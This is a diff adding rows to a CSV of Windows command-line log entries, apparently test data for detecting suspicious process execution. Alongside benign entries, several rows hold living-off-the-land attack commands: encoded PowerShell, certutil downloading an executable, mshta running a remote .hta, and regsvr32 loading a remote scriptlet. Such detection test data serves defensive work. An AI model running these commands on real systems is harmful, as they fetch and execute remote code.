@@ -1,7 +1,10 @@
-
 timestamp,computer,user,command_line
 2026-11-09 10:00:00,PC-01,Pedro,whoami
 2026-11-09 10:02:00,PC-02,Hafidh,powershell -enc SQBFAFgA
 2026-11-09 10:05:00,PC-03,Gomes,notepad.exe
 2026-11-09 10:08:00,PC-04,Ihor,certutil -urlcache -split -f http://example.com/file.exe
 2026-11-09 10:10:00,PC-05,Cabral,calc.exe
+2026-11-11 10:00:00,PC-06,Admin,powershell -EncodedCommand SQBFAFgA
+2026-11-11 10:02:00,PC-07,User01,echo powershell -enc
+2026-11-11 10:04:00,PC-08,Admin,mshta.exe https://example.com/test.hta
+2026-11-13 10:00:00,PC-09,Admin,regsvr32.exe /s /n /u /i:https://example.com/test.sct scrobj.dll
